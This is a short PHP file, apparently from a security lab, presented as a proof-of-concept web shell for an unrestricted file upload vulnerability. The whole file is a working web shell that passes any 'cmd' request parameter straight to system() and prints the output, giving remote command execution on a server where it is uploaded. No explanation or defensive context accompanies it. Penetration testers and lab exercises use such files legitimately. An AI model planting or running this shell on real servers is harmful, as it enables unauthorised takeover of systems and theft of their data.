<?php
// Bazaarjo Lab - Proof of Concept Web Shell (Unrestricted File Upload)
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
